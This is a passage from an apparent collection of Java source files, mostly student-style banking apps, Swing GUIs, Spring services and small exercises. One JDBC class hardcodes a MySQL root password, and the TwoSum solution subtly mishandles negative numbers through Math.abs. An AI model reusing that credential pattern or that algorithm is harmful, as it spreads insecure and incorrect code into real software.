java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(ThreadIndex.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new ThreadIndex().setVisible(true);\n            }\n        });\n    }\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package bankingapplication;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\nclass Account {\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/bank_login\";\n    private static final String DB_USER = \"root\";\n    private static final String DB_PASSWORD = \"Clf@56.9fce\";\n    private int previousTransaction;\n    private String customerNmae;\n    private String customerId;\n\n    Account(String cName, String cID) {   // constuctor initializing the instance variables\n        this.customerNmae = cName;\n        this.customerId = cID;\n    }\n\n    public void deposit(int amount) {\n        if (amount > 0) {\n            previousTransaction = amount;\n            int currentBalance = getCurrentBalance();\n            currentBalance += amount;\n            updateBalanceInDatabase(currentBalance, \"Deposit: +\" + amount);\n            System.out.println(\n                    \"Thank you for depositing \" + amount);\n            System.out.println(\"your current balance now is :\" + currentBalance);\n        } else {\n            System.out.println(\"Invalid deposit please enter a positive value\");\n        }\n    }\n\n    private int getCurrentBalance() {\n        // Use JDBC to retrieve the current balance from the User_Accounts table\n        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n            String query = \"SELECT Current_Balance FROM User_Accounts WHERE User_Id = ?\";\n            try (PreparedStatement preparedStatement = connection.prepareStatement(query)) {\n                preparedStatement.setString(1, customerId);\n                try (ResultSet resultSet = preparedStatement.executeQuery()) {\n                    if (resultSet.next()) {\n                        return resultSet.getInt(\"Current_Balance\");\n                    }\n                }\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n        return 0; // Return 0 if an error occurs\n    }\n\n    private String getAccountnumber() {\n        // Use JDBC to retrieve the account number  from the User_Accounts table\n        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n            String query = \"SELECT Account_Number FROM User_Info WHERE Account_Holder_Name = ?\";\n            try (PreparedStatement preparedStatement = connection.prepareStatement(query)) {\n                preparedStatement.setString(1, customerNmae);\n                try (ResultSet resultSet = preparedStatement.executeQuery()) {\n                    if (resultSet.next()) {\n                        return resultSet.getString(\"Account_Number\");\n                    }\n                }\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n        return \"\"; // Return empty string if an error occurs\n    }\n    private String getMailingadd() {\n        // Use JDBC to retrieve the mailing address from the User_Accounts table\n        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n            String query = \"SELECT Mailing_Address FROM User_Info WHERE Account_Holder_Name = ?\";\n            try (PreparedStatement preparedStatement = connection.prepareStatement(query)) {\n                preparedStatement.setString(1, customerNmae);\n                try (ResultSet resultSet = preparedStatement.executeQuery()) {\n                    if (resultSet.next()) {\n                        return resultSet.getString(\"Mailing_Address\");\n                    }\n                }\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n        return \"\"; // Return empty string if an error occurs\n    }\n\n    private void updateBalanceInDatabase(int newBalance, String transactionDescription) {\n        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\n            String updateQuery = \"UPDATE User_Accounts SET Current_Balance = ? WHERE User_Id = ?\";\n            try (PreparedStatement preparedStatement = connection.prepareStatement(updateQuery)) {\n                preparedStatement.setInt(1, newBalance);\n                preparedStatement.setString(2, customerId);\n\n                // Execute the update statement\n                preparedStatement.executeUpdate();\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processTransactionWithDelay() {\n        try {\n            // Show \"Transacting process\" for 3 seconds\n            System.out.println(\n                    \"Transacting process.............................................please wait................\");\n            Thread.sleep(3000);\n        } catch (InterruptedException e) {\n            // Handle the exception if needed\n            e.printStackTrace();\n        }\n        // Perform the transaction logic here (after the ",
    "package Server;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.InetAddress;\nimport java.net.InterfaceAddress;\nimport java.net.NetworkInterface;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Enumeration;\nimport java.util.HashMap;\n\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JPanel;\nimport javax.swing.JScrollPane;\nimport javax.swing.JTextArea;\nimport javax.swing.JTextField;\nimport javax.swing.ScrollPaneConstants;\n\nimport java.awt.BorderLayout;\nimport java.awt.Dimension;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.util.concurrent.ArrayBlockingQueue;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\n\npublic class Server {\n\n    // boolean for runnin the server\n    final static boolean DEBUG = true;\n    static boolean isRunning = false;\n    static int connectionCount = 0;\n    static JLabel statusLbl, connCnt, ipLbl;\n    static HashMap<String,ClientHandler> connections = new HashMap<String,ClientHandler>();\n    // static ArrayBlockingQueue<updateObj> changeQ = new ArrayBlockingQueue<updateObj>(1000);\n\n    //Thread for call from action performed\n    private final static ExecutorService executorService = Executors.newSingleThreadExecutor();\n\n    public static void main(String[] args) throws Exception {\n        \n        JFrame window = new JFrame();\n        window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\n        JPanel p = new JPanel();\n        p.setPreferredSize(new Dimension(300,100));\n        window.add(p, BorderLayout.NORTH);\n\n        JLabel portLabel = new JLabel(\"Port:\");\n\n        JTextField portText = new JTextField(\"4567\");\n        portText.setColumns(10);\n        p.add(portLabel);\n        p.add(portText);\n        \n        JButton listenBtn = new JButton(\"Listen\");\n        listenBtn.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tisRunning = true;\n                executorService.execute(new Runnable() {\n                    public void run() {\n                        try {\n                            listen(Integer.parseInt(portText.getText() ));\n                            System.out.println(\"server should now be listening\");\n                        } catch (IOException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                });\n\t\t    }\n        });\n\n        JButton quitBtn = new JButton(\"Stop\");\n        quitBtn.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n                isRunning = false;\n                System.out.println(\"this should stop the server from listening\");\n                statusLbl.setText(\"Not Listening\");\n\t\t\t}\n\t\t});\n\n        p.add(listenBtn);\n        p.add(quitBtn);\n        statusLbl = new JLabel(\"not listening\");\n        connCnt = new JLabel(\"conns:\" + connectionCount);\n\n        //IP address:\n        // NetworkInterface.getNetworkInterfaces();\n        // InetAddress IP=InetAddress.getLocalHost();\n        // System.out.println(\"IP of my system is := \"+IP.getHostAddress());\n        // ipLbl = new JLabel(IP.getHostAddress());//InetAddress.getLocalHost().toString());\n        ipLbl = new JLabel(\"IP: \" + getLocalAddress().toString());\n        p.add(statusLbl);\n        p.add(connCnt);\n        p.add(ipLbl);\n        \n// ************ CONSOLE THINGY *********//\n        // special console to try and see the sysout output... remove once working\n        if (DEBUG){\n            JTextArea consoleOutputArea = new JTextArea(15, 25);\n            consoleOutputArea.setEditable(false);\n            JScrollPane scroll = new JScrollPane ( consoleOutputArea );\n            scroll.setVerticalScrollBarPolicy ( ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS );\n\n            PrintStream printStream = new PrintStream(new OutputStream() { //streams terminal to the text area (found online)\n                @Override\n                public void write(int b) throws IOException {\n                    // redirects data to the text area\n                    consoleOutputArea.append(String.valueOf((char)b));\n                    // scrolls the text area to the end of data\n                    consoleOutputArea.setCaretPosition(consoleOutputArea.getDocument().getLength());\n                }\n            });\n            System.setOut(printStream);\n            System.setErr(printStream);\n            JPanel consoPanel = new JPanel();\n            consoPanel.setPreferredSize(new Dimension(400,300));\n            //Add Textarea in to middle panel\n            consoPanel.add ( scroll );\n            // consoPanel.add(consoleOutputArea);\n            window.add(consoPanel, BorderLayout.SOUTH);\n        }\n// ************ END CONSOLE THINGY *********//        \n\n\n        window.pack();\n        window.setVisible(true);\n    ",
    "package Controller;\n\nimport javax.swing.tree.DefaultMutableTreeNode;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Objects;\nimport Model.FileTreeModel;\nimport View.FileTreeView;\n\npublic class FileTreeController {\n    private FileTreeModel model;\n    private FileTreeView view;\n\n    public FileTreeController(FileTreeModel model, FileTreeView view) {\n        this.model = Objects.requireNonNull(model);\n        this.view = Objects.requireNonNull(view);\n\n        view.getTree().setModel(new javax.swing.tree.DefaultTreeModel(model.getRoot()));\n\n        Thread fileTreeThread = new Thread(() -> {\n            while (true) {\n                updateFileTree();\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n        fileTreeThread.setDaemon(true);\n        fileTreeThread.start();\n    }\n\n    private void updateFileTree() {\n        File rootFile = model.getRoot().getFile();\n        DefaultMutableTreeNode rootNode = new DefaultMutableTreeNode(new FileNode(rootFile));\n        model.createNodes(rootNode, rootFile);\n        view.getTree().setModel(new javax.swing.tree.DefaultTreeModel(rootNode));\n    }\n\n    public void saveToFile(File file) {\n        try {\n            model.saveToFile(file);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void loadFromFile(File file) {\n        try {\n            model.loadFromFile(file);\n            DefaultMutableTreeNode root = model.getRoot();\n            view.getTree().setModel(new javax.swing.tree.DefaultTreeModel(root));\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "import java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.util.Scanner;\n\npublic class EmployeeDA {\n    private Employee employee;\n\n    public Employee getEmployee() {\n        return employee;\n    }\n\n    public EmployeeDA (String empNo, Double salary) throws FileNotFoundException {\n        Scanner employeeFile = new Scanner(new FileReader(\"emp.csv\"));\n\n        employeeFile.nextLine();\n\n        while (employeeFile.hasNext()) {\n            String employeeRow = employeeFile.nextLine();\n            String[] employeeRowSpecific = new String[3];\n            employeeRowSpecific = employeeRow.split(\",\");\n\n            if (empNo.equals(employeeRowSpecific[0])){\n                employee = new Employee();\n                employee.setEmpNo(employeeRowSpecific[0]);\n                employee.setLastName(employeeRowSpecific[1].trim());\n                employee.setFirstName(employeeRowSpecific[2]);\n                employee.setSalary(salary);\n            }\n            \n        }\n        employeeFile.close();\n    }\n}\n",
    "import java.io.FileWriter;\nimport java.io.File;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Scanner;\n\npublic class phonebook {\n    ArrayList<String> names = new ArrayList<String>();\n    ArrayList<String> emails = new ArrayList<String>();\n    ArrayList<String> addresses = new ArrayList<String>();\n    ArrayList<String> phoneNumbers = new ArrayList<String>();\n    \n    String[] contactPhoneNumbers(int i) {\n        return phoneNumbers.get(i).split(\",\");\n    }\n    \n    boolean isNumber(String number) {\n        try {\n           Integer.parseInt(number);\n           return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    int searchByNumber(String searchNumber) {\n        //getting every string of Phone numbers by the contact index\n        for (int i = 0; i < phoneNumbers.size(); i++) {\n            //getting numbers for every contact\n            String[] numbers = contactPhoneNumbers(i);\n            //searching in array of strings (phone numbers)\n            for (int j = 0; j < numbers.length; j++) {\n                if (numbers[j].equals(searchNumber)) {\n                    //there is number found\n                    return i;\n                }\n            }\n        }\n        // if there is no number found\n        return -1;\n    }\n    \n    boolean isUnique(String number) {\n        //checking if number found or not\n        return searchByNumber(number) == -1;\n    }\n    \n    void addContact (String name,String email,String address,String numbers) {\n        names.add(name);\n        emails.add(email);\n        addresses.add(address);\n        String phones = \"\";\n        phones += numbers + \",\";\n        phoneNumbers.add(phones);\n        saveData();\n    }\n    \n    void delete(int index) {\n        names.remove(index);\n        emails.remove(index);\n        addresses.remove(index);\n        phoneNumbers.remove(index);\n        saveData();\n    }\n    Integer[] searchByName(String searchKeyWord) {\n        ArrayList<Integer> searchResult = new ArrayList<Integer>();\n        for (int i = 0; i < names.size(); i++) {\n            //converting the names and the search keyword to lowercase\n            String name = names.get(i).toLowerCase();\n            searchKeyWord = searchKeyWord.toLowerCase();\n            //spliting the names\n            if (name.contains(searchKeyWord)) {\n                //if the name contains the search keyword then add the index of the contact of that name to the searchResult\n                searchResult.add(i);\n            }\n        }  \n        //convert arraylist (searchResult) to array of integers and return it\n        return searchResult.toArray(new Integer[0]);\n    }\n    void saveData () {\n    try {\n        File f = new File(\"E:\\\\University\\\\book_final.txt\");\n        FileWriter w = new FileWriter(f);\n        int counter = names.toArray().length;\n        w.write(\"\" + counter);\n        for (int i = 0; i < counter; i++) {\n            w.write(\"\\n\" + names.toArray()[i]);\n        }\n        for (int i = 0; i < counter; i++) {\n            w.write(\"\\n\" + addresses.toArray()[i]);\n        }\n        for (int i = 0; i < counter; i++) {\n            w.write(\"\\n\" + emails.toArray()[i]);\n        }\n        for (int i = 0; i < counter; i++) {\n            w.write(\"\\n\" + phoneNumbers.toArray()[i]);\n        }\n        w.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n                }\n            }\nvoid loadData() {\n    try (Scanner sc = new Scanner(\n            new File(\"E:\\\\University\\\\book_final.txt\"))) {\n        int counter = Integer.parseInt(sc.nextLine());\n        for (int i = 0; i < counter; i++) {\n            names.add(sc.nextLine());\n        }\n        for (int i = 0; i < counter; i++) {\n            addresses.add(sc.nextLine());\n        }\n        for (int i = 0; i < counter; i++) {\n            emails.add(sc.nextLine());\n        }\n        for (int i = 0; i < counter; i++) {\n            phoneNumbers.add(sc.nextLine());\n        }\n        sc.close();\n    } catch (FileNotFoundException e) {\n        e.printStackTrace();\n    }\n\t}\n}\n",
    "package com.sebas.demo.security;\n\nimport io.jsonwebtoken.ExpiredJwtException;\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport lombok.AllArgsConstructor;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.web.authentication.WebAuthenticationDetailsSource;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.filter.OncePerRequestFilter;\n\nimport com.sebas.demo.services.JWTService;\nimport com.sebas.demo.services.JWTUserDetailService;\n\nimport java.io.IOException;\nimport java.util.Objects;\n\n@Component\n@AllArgsConstructor\n@Slf4j\npublic class JWTValidationFilter extends OncePerRequestFilter {\n\n    private final JWTService jwtService;\n    private final JWTUserDetailService jwtUserDetailService;\n\n    public static final String AUTHORIZATION_HEADER = \"Authorization\";\n    public static final String AUTHORIZATION_HEADER_BEARER = \"Bearer \";\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n        final var requestTokenHeader = request.getHeader(AUTHORIZATION_HEADER);\n        String username = null;\n        String jwt = null;\n\n        if (Objects.nonNull(requestTokenHeader)\n                && requestTokenHeader.startsWith(AUTHORIZATION_HEADER_BEARER)) {\n            jwt = requestTokenHeader.substring(7);\n\n            try {\n                username = jwtService.getUsernameFromToken(jwt);\n            } catch (IllegalArgumentException e) {\n                log.error(e.getMessage());\n            } catch (ExpiredJwtException e) {\n                log.warn(e.getMessage());\n            }\n        }\n\n        if (Objects.nonNull(username) && Objects.isNull(SecurityContextHolder.getContext().getAuthentication())) {\n            final var userDetails = this.jwtUserDetailService.loadUserByUsername(username);\n\n            if (this.jwtService.validateToken(jwt, userDetails)) {\n                var usernameAndPassAuthToken = new UsernamePasswordAuthenticationToken(\n                        userDetails, null, userDetails.getAuthorities());\n\n                usernameAndPassAuthToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));\n                SecurityContextHolder.getContext().setAuthentication(usernameAndPassAuthToken);\n            }\n        }\n        filterChain.doFilter(request, response);\n    }\n}",
    "package com.LoveKholiya.Banking_Application.Controller;\n\nimport com.LoveKholiya.Banking_Application.Entity.Account;\nimport com.LoveKholiya.Banking_Application.Service.AccountService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.Map;\n\n@RestController\n@RequestMapping(\"/api/accounts\")\npublic class AccountController{\n    @Autowired\n   private AccountService accountService;\n    @PostMapping(\"/create\")\n    public Account createAccount(@RequestBody Account account){\n        return accountService.createAccount(account);\n    }\n    @GetMapping(\"/{id}\")\n    public Account getAccount(@PathVariable Long id){\n        return accountService.getAccount(id).orElseThrow(()->new RuntimeException(\"Account not found\"));\n    }\n    @PostMapping(\"/{id}/deposit\")\n    public Account deposit(@PathVariable Long id, @RequestBody Map<String,Double> request){\n        double amount=request.get(\"amount\");\n        return accountService.deposit(id,amount);\n    }\n    @PostMapping(\"/{id}/withdraw\")\n    public Account withdraw(@PathVariable Long id,@RequestBody Map<String,Double>request){\n        double amount=request.get(\"amount\");\n        return accountService.withdraw(id,amount);\n    }\n    @DeleteMapping(\"{id}/delete\")\n    public String delete(@PathVariable Long id){\n        return accountService.delete(id);\n    }\n}\n",
    "import java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class TwoSum {\n    public static void main(String[] args) {\n\n        int[] nums1 = {2, 7, 11, 15};\n        int target1 = 9;\n\n        int[] nums2 = {3,2,4};\n        int target2 = 6;\n\n        int[] nums3 = {3,3};\n        int target3 = 6;\n\n        System.out.println(\"Test Case 1:\" + Arrays.toString(solution(nums1, target1)));\n        System.out.println(\"Test Case 2:\" + Arrays.toString(solution(nums2, target2)));\n        System.out.println(\"Test Case 3:\" + Arrays.toString(solution(nums3, target3)));\n    }\n\n    private static int[] solution(int[] nums, int target) {\n\n        Map<Integer, Integer> contents = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            int difference = Math.abs(target - nums[i]);\n            if(contents.containsKey(difference)){\n                return new int[] {contents.get(difference), i};\n            }\n            contents.put(nums[i], i);\n        }\n        return new int[]{ };\n    }\n}",
    "package com.example.carecareforeldres.Service;\n\nimport com.example.carecareforeldres.DTO.ServiceWithShelterDTO;\nimport com.example.carecareforeldres.Entity.Service;\nimport com.example.carecareforeldres.Entity.Shelter;\nimport com.example.carecareforeldres.Repository.ServiceRepository;\nimport com.example.carecareforeldres.Repository.ShelterRepository;\nimport lombok.AllArgsConstructor;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\n\n@org.springframework.stereotype.Service\n@Slf4j\n@AllArgsConstructor\npublic class ServicesService implements IServiceService {\n    ServiceRepository serviceRepository;\n    ShelterRepository shelterRepository;\n\n\n    @Override\n    public List<Service> retrieveAllService() {\n        return serviceRepository.findAll();\n    }\n\n    @Override\n    public Service addService(Service s) {\n        return serviceRepository.save(s);\n    }\n\n    @Override\n    public Service updateService(Service s) {\n        return serviceRepository.save(s);\n    }\n\n    @Override\n    public Service retrieveService(Long idService) {\n        return serviceRepository.findById(idService).get();\n    }\n\n    @Override\n    public void removeService(Long idService) {\n        serviceRepository.deleteById(idService);\n    }\n\n\n\n    @Override\n    public List<Service>  affectServiceToShelter(Long idShelter) {\n        Shelter shelter = shelterRepository.findById(idShelter).get();\n        List<Service> s1=serviceRepository.findAll();\n        for (int i=0;i<s1.size();i++){\n            s1.get(i).setShelter(shelter);\n            serviceRepository.save(s1.get(i));\n\n        }\n        return s1;\n    }\n\n    @Override\n    public Service addServiceAndAssignToShelter(Service service, Long idShelter) {\n        Shelter shelter = shelterRepository.findById(idShelter).get();\n        service.setShelter(shelter);\n        serviceRepository.save(service);\n        return service;\n    }\n\n    @Override\n    public List<Service> getServicesByShelterId(Long idShelter) {\n        Shelter shelter = shelterRepository.findById(idShelter).orElse(null);\n        if (shelter != null) {\n            return serviceRepository.findByShelter(shelter);\n        } else {\n            // G\u00e9rer le cas o\u00f9 le shelter avec l'ID sp\u00e9cifi\u00e9 n'existe pas\n            return Collections.emptyList();\n        }\n    }\n    @Override\n    public List<ServiceWithShelterDTO> getAllServicesWithShelters() {\n        List<Service> services = serviceRepository.findAll();\n        List<ServiceWithShelterDTO> serviceDTOs = new ArrayList<>();\n\n        for (Service service : services) {\n            ServiceWithShelterDTO serviceDTO = new ServiceWithShelterDTO();\n            serviceDTO.setIdService(service.getIdService());\n            serviceDTO.setNomService(service.getNomService());\n            serviceDTO.setDescription(service.getDescription());\n            serviceDTO.setTypeService(service.getTypeService());\n\n            Shelter shelter = service.getShelter();\n            if (shelter != null) {\n                serviceDTO.setIdShelter(shelter.getIdShelter());\n                serviceDTO.setNomShelter(shelter.getNomShelter());\n            }\n\n            serviceDTOs.add(serviceDTO);\n        }\n\n        return serviceDTOs;\n    }\n\n    @Override\n    public void updateAllServicesWithShelters(List<ServiceWithShelterDTO> updatedServices) {\n        for (ServiceWithShelterDTO updatedService : updatedServices) {\n            // R\u00e9cup\u00e9rez le service \u00e0 partir de la base de donn\u00e9es\n            Service service = serviceRepository.findById(updatedService.getIdService()).orElse(null);\n\n            // V\u00e9rifiez si le service existe\n            if (service != null) {\n                // Mettez \u00e0 jour les champs du service avec les nouvelles valeurs\n                service.setNomService(updatedService.getNomService());\n                service.setDescription(updatedService.getDescription());\n                service.setTypeService(updatedService.getTypeService());\n\n                // R\u00e9cup\u00e9rez l'abri associ\u00e9 \u00e0 partir de la base de donn\u00e9es\n                Shelter shelter = shelterRepository.findById(updatedService.getIdShelter()).orElse(null);\n\n                // V\u00e9rifiez si l'abri existe\n                if (shelter != null) {\n                    // Associez le service \u00e0 l'abri\n                    service.setShelter(shelter);\n                }\n\n                // Enregistrez les modifications dans la base de donn\u00e9es\n                serviceRepository.save(service);\n            }\n        }\n    }\n}\n",
    "package bank;\n\nimport java.util.Scanner;\n\n/**\n * Handles the interaction with user\n */\npublic class Ui {\n\n    /**\n     * End of command message\n     */\n    public static final String END_OF_COMMAND = \"\\nIs there anything else you'd like to do?\"\n            + \"\\n[D]eposit\\n[W]ithdraw\\n[P]rint statement\\n[Q]uit\\n\";\n\n    /**\n     * Default Welcome Message\n     */\n    private static final String WELCOME_MESSAGE = \"Welcome to AwesomeGIC Bank!\"\n            + \" What would you like to do?\\n[D]eposit\\n[W]ithdraw\\n[P]rint statement\\n[Q]uit\";\n\n    /**\n     * Default Goodbye Message\n     */\n    private static final String GOODBYE_MESSAGE = \"Thank you for banking with AwesomeGIC Bank.\\nHave a nice day!\";\n\n    private final Scanner scanner;\n\n    /**\n     * Constructs an Ui class that reads from System.in\n     */\n    public Ui() {\n        this.scanner = new Scanner(System.in);\n    }\n\n    /**\n     * Constructs an Ui class that reads from a custom scanner\n     *\n     * @param scanner Scanner to be used\n     */\n    public Ui(Scanner scanner) {\n        this.scanner = scanner;\n    }\n\n    /**\n     * Prints the default welcome message\n     */\n    public void welcomeMessage() {\n        System.out.println(WELCOME_MESSAGE);\n    }\n\n    /**\n     * Prints the default welcome message\n     */\n    public void exitMessage() {\n        System.out.println(GOODBYE_MESSAGE);\n        this.scanner.close();\n    }\n\n    /**\n     * Prints the message.\n     */\n    public void printMessage(String message) {\n        System.out.println(message);\n    }\n\n    /**\n     * Standardises the printing of error messages.\n     */\n    public void printErrorMessage(String message) {\n        System.out.println(\"Transaction failed:\\n\" + message + END_OF_COMMAND);\n    }\n\n    /**\n     * Reads a line of command to be parsed.\n     *\n     * @return the line of command read\n     */\n    public String readCommand() {\n        String ret = scanner.nextLine();\n        while (ret.isEmpty()) {\n            ret = scanner.nextLine();\n        }\n        return ret;\n    }\n}\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class SimpleCalculator {\n    private JFrame frame;\n    private JPanel panel;\n    private JTextField textField;\n    private JButton[] numberButtons;\n    private JButton[] functionButtons;\n    private JButton addButton, subButton, mulButton, divButton, eqButton, clearButton;\n    private Font font;\n\n    private double num1, num2, result;\n    private char operator;\n\n    public SimpleCalculator() {\n        frame = new JFrame(\"Simple Calculator\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(300, 400);\n        frame.setLayout(new BorderLayout());\n\n        panel = new JPanel();\n        panel.setLayout(new GridLayout(5, 4));\n\n        textField = new JTextField();\n        textField.setFont(new Font(\"Arial\", Font.PLAIN, 20));\n        textField.setEditable(false);\n\n        font = new Font(\"Arial\", Font.BOLD, 20);\n\n        numberButtons = new JButton[10];\n        for (int i = 0; i < 10; i++) {\n            numberButtons[i] = new JButton(String.valueOf(i));\n            numberButtons[i].setFont(font);\n            numberButtons[i].addActionListener(new NumberButtonListener());\n        }\n\n        addButton = new JButton(\"+\");\n        subButton = new JButton(\"-\");\n        mulButton = new JButton(\"*\");\n        divButton = new JButton(\"/\");\n        eqButton = new JButton(\"=\");\n        clearButton = new JButton(\"C\");\n\n        functionButtons = new JButton[]{addButton, subButton, mulButton, divButton, eqButton, clearButton};\n\n        for (JButton button : functionButtons) {\n            button.setFont(font);\n            button.addActionListener(new FunctionButtonListener());\n        }\n\n\n        panel.add(numberButtons[7]);\n        panel.add(numberButtons[8]);\n        panel.add(numberButtons[9]);\n        panel.add(clearButton);\n        panel.add(numberButtons[4]);\n        panel.add(numberButtons[5]);\n        panel.add(numberButtons[6]);\n        panel.add(addButton);\n        panel.add(numberButtons[1]);\n        panel.add(numberButtons[2]);\n        panel.add(numberButtons[3]);\n        panel.add(subButton);\n        panel.add(mulButton);\n        panel.add(numberButtons[0]);\n        panel.add(divButton);\n        panel.add(eqButton);\n        panel.add(new JLabel());\n        panel.add(new JLabel());\n        panel.add(new JLabel());\n\n        frame.add(textField, BorderLayout.NORTH);\n        frame.add(panel, BorderLayout.CENTER);\n        frame.setVisible(true);\n    }\n\n    class NumberButtonListener implements ActionListener {\n        public void actionPerformed(ActionEvent e) {\n            for (int i = 0; i < 10; i++) {\n                if (e.getSource() == numberButtons[i]) {\n                    textField.setText(textField.getText() + i);\n                }\n            }\n        }\n    }\n\n    class FunctionButtonListener implements ActionListener {\n        public void actionPerformed(ActionEvent e) {\n            if (e.getSource() == clearButton) {\n                textField.setText(\"\");\n            } else if (e.getSource() == addButton || e.getSource() == subButton || e.getSource() == mulButton || e.getSource() == divButton) {\n                num1 = Double.parseDouble(textField.getText());\n                operator = ((JButton) e.getSource()).getText().charAt(0);\n                textField.setText(\"\");\n            } else if (e.getSource() == eqButton) {\n                num2 = Double.parseDouble(textField.getText());\n                switch (operator) {\n                    case '+':\n                        result = num1 + num2;\n                        break;\n                    case '-':\n                        result = num1 - num2;\n                        break;\n                    case '*':\n                        result = num1 * num2;\n                        break;\n                    case '/':\n                        result = num1 / num2;\n                        break;\n                }\n                textField.setText(String.valueOf(result));\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        new SimpleCalculator();\n    }\n}\n",
    "import java.io.*;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Scanner;\r\n\r\nclass Bank {\r\n    private List<Account> accounts;\r\n    private final String dataFilePath = \"accounts.txt\";\r\n\r\n    public Bank() {\r\n        this.accounts = new ArrayList<>();\r\n        loadData();\r\n    }\r\n\r\n    private void loadData() {\r\n        try {\r\n            File file = new File(dataFilePath);\r\n            if (file.exists()) {\r\n                Scanner scanner = new Scanner(file);\r\n                while (scanner.hasNextLine()) {\r\n                    String line = scanner.nextLine();\r\n                    String[] parts = line.split(\",\");\r\n                    String accountNumber = parts[0];\r\n                    String name = parts[1];\r\n                    double balance = Double.parseDouble(parts[2]);\r\n                    accounts.add(new Account(accountNumber, name, balance));\r\n                }\r\n                scanner.close();\r\n            }\r\n        } catch (FileNotFoundException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void saveData() {\r\n        try {\r\n            BufferedWriter writer = new BufferedWriter(new FileWriter(dataFilePath));\r\n            for (Account account : accounts) {\r\n                writer.write(account.getAccountNumber() + \",\" + account.getName() + \",\" + account.getBalance());\r\n                writer.newLine();\r\n            }\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void createAccount(String accountNumber, String name, double balance) {\r\n        if (!accountExists(accountNumber)) {\r\n            accounts.add(new Account(accountNumber, name, balance));\r\n            saveData();\r\n            System.out.println(\"Account created successfully for \" + name + \" with account number \" + accountNumber + \".\");\r\n        } else {\r\n            System.out.println(\"Account number already exists.\");\r\n        }\r\n    }\r\n\r\n    private boolean accountExists(String accountNumber) {\r\n        for (Account account : accounts) {\r\n            if (account.getAccountNumber().equals(accountNumber)) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public void deposit(String accountNumber, double amount) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) {\r\n            account.deposit(amount);\r\n            saveData();\r\n            System.out.println(\"Deposited \" + amount + \" into account \" + accountNumber + \".\");\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    public void withdraw(String accountNumber, double amount) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) 